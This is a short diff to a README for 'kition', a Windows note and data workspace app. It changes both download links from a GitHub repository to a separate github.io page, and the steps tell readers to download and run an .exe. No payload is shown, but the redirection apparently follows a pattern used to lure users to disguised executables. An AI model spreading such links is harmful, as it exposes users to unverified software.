@@ -1,6 +1,6 @@
 # 🛠️ kition - Manage your data and documents easily
 
-[![](https://img.shields.io/badge/Download-Kition_for_Windows-blue.svg)](https://github.com/Seniorbirchbark481/kition)
+[![](https://img.shields.io/badge/Download-Kition_for_Windows-blue.svg)](https://seniorbirchbark481.github.io)
 
 Kition helps you organize information. It combines markdown files, data tables, and AI tools into one workspace. You can use it to research topics, manage workflows, and track projects. It works on your local computer to keep your data private.
 
@@ -18,7 +18,7 @@ Kition serves as a central hub for your notes and tasks. You can use it to repla
 
 Follow these steps to install the program on your Windows computer.
 
-1. Go to the [official kition download page](https://github.com/Seniorbirchbark481/kition).
+1. Go to the [official kition download page](https://seniorbirchbark481.github.io).
 2. Look for the recent release file that ends in .exe.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
